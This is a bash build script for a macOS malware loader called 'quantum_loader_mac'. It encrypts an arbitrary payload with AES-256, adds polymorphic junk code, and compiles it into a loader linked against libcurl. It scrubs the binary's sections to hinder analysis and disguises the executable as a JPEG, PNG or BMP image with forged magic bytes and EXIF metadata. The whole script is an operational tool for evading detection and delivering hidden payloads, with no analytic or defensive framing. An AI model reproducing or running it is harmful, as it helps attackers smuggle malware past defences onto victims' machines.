#!/bin/bash
set -e

POLYGLOT=1
EXIF=1
IMAGE_FORMAT="jpg"

usage() {
    echo "Usage: $0 <output> <payload.bin> <base_key> <salt> <iv> [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  --no-polyglot      Build binary only, skip polyglot creation"
    echo "  --no-exif          Skip EXIF metadata embedding"
    echo "  --format <fmt>     Image format: jpg, png, bmp (default: jpg)"
    echo "  --help             Show this help message"
    exit 1
}

if [ $# -lt 5 ]; then
    usage
fi

OUTPUT_FILE="$1"
PAYLOAD="$2"
BASE_KEY="$3"
SALT="$4"
IV="$5"
shift 5

while [ $# -gt 0 ]; do
    case "$1" in
        --no-polyglot)
            POLYGLOT=0
            ;;
        --no-exif)
            EXIF=0
            ;;
        --format)
            shift
            IMAGE_FORMAT="$1"
            if [[ ! "$IMAGE_FORMAT" =~ ^(jpg|png|bmp)$ ]]; then
                echo "Error: Invalid format. Use jpg, png, or bmp"
                exit 1
            fi
            ;;
        --help)
            usage
            ;;
        *)
            echo "Unknown option: $1"
            usage
            ;;
    esac
    shift
done

OUTPUT="quantum_loader_mac"
TEMP_C="temp.c"

# Generate junk.h
echo "[*] Generating polymorphic junk.h..."
python3 generate_junk.py

# Encrypt payload
echo "[*] Encrypting payload..."
DERIVED_KEY=$(openssl hkdf -binary -md sha256 -keylen 32 -salt "$SALT" -inkey "$BASE_KEY")
openssl enc -aes-256-cbc -in "$PAYLOAD" -out payload.enc -K "$DERIVED_KEY" -iv "$IV" -nopad

# Convert to hex
ENC_PAYLOAD=$(xxd -p payload.enc | tr -d '\n' | sed 's/../\\x&/g')
SALT_HEX=$(echo -n "$SALT" | xxd -p | tr -d '\n' | sed 's/../\\x&/g')
IV_HEX=$(echo -n "$IV" | xxd -p | tr -d '\n' | sed 's/../\\x&/g')
BASE_KEY_HEX=$(echo -n "$BASE_KEY" | xxd -p | tr -d '\n' | sed 's/../\\x&/g')

# Inject into C template
echo "[*] Generating C code..."
sed "s|__ENCRYPTED_PAYLOAD__|$ENC_PAYLOAD|" quantum_loader_mac.c \
    | sed "s|__FIXED_SALT__|$SALT_HEX|" \
    | sed "s|__IV__|$IV_HEX|" \
    | sed "s|__BASE_KEY__|$BASE_KEY_HEX|" > "$TEMP_C"

# Compile
echo "[*] Compiling..."
clang -Os -o "$OUTPUT" "$TEMP_C" -lcurl

# Strip and scrub sections
echo "[*] Scrubbing binary sections..."
python3 scrub_sections.py "$OUTPUT" 2>/dev/null || (strip "$OUTPUT" && echo "[!] Section scrubbing skipped (lief not installed)")

if [ $POLYGLOT -eq 1 ]; then
    echo "[*] Creating polyglot image ($IMAGE_FORMAT)..."
    
    case "$IMAGE_FORMAT" in
        jpg)
            echo -ne '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > "$OUTPUT_FILE"
            cat "$OUTPUT" >> "$OUTPUT_FILE"
            ;;
        png)
            echo -ne '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' > "$OUTPUT_FILE"
            cat "$OUTPUT" >> "$OUTPUT_FILE"
            ;;
        bmp)
            SIZE=$(stat -f%z "$OUTPUT")
            TOTAL=$((54 + SIZE))
            printf '\x42\x4d' > "$OUTPUT_FILE"
            printf '\\x%02x\\x%02x\\x%02x\\x%02x' $(($TOTAL & 0xff)) $((($TOTAL >> 8) & 0xff)) $((($TOTAL >> 16) & 0xff)) $((($TOTAL >> 24) & 0xff)) >> "$OUTPUT_FILE"
            printf '\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00' >> "$OUTPUT_FILE"
            cat "$OUTPUT" >> "$OUTPUT_FILE"
            ;;
    esac
    
    if [ $EXIF -eq 1 ] && command -v exiftool &> /dev/null; then
        echo "[*] Embedding EXIF metadata..."
        exiftool -overwrite_original -Model="QuantumMac" -Artist="InvisibleThread" -Comment="Secure Payload" "$OUTPUT_FILE" > /dev/null 2>&1 || echo "[!] EXIF embedding failed"
    fi
    
    chmod +x "$OUTPUT_FILE"
    
    echo "[*] Validating polyglot integrity..."
    case "$IMAGE_FORMAT" in
        jpg)
            if head -c 2 "$OUTPUT_FILE" | xxd -p | grep -q "ffd8"; then
                echo "[✓] JPEG magic bytes verified"
            else
                echo "[!] Warning: JPEG magic bytes invalid"
            fi
            ;;
        png)
            if head -c 8 "$OUTPUT_FILE" | xxd -p | grep -q "89504e470d0a1a0a"; then
                echo "[✓] PNG magic bytes verified"
            else
                echo "[!] Warning: PNG magic bytes invalid"
            fi
            ;;
        bmp)
            if head -c 2 "$OUTPUT_FILE" | xxd -p | grep -q "424d"; then
                echo "[✓] BMP magic bytes verified"
            else
                echo "[!] Warning: BMP magic bytes invalid"
            fi
            ;;
    esac
    
    if command -v file &> /dev/null; then
        FILE_TYPE=$(file "$OUTPUT_FILE")
        echo "[*] File type check: $FILE_TYPE"
    fi
    
    echo "[✓] Polyglot complete: $OUTPUT_FILE"
else
    mv "$OUTPUT" "$OUTPUT_FILE"
    chmod +x "$OUTPUT_FILE"
    echo "[✓] Binary complete: $OUTPUT_FILE"
fi

rm -f "$TEMP_C" payload.enc junk.h "$OUTPUT"
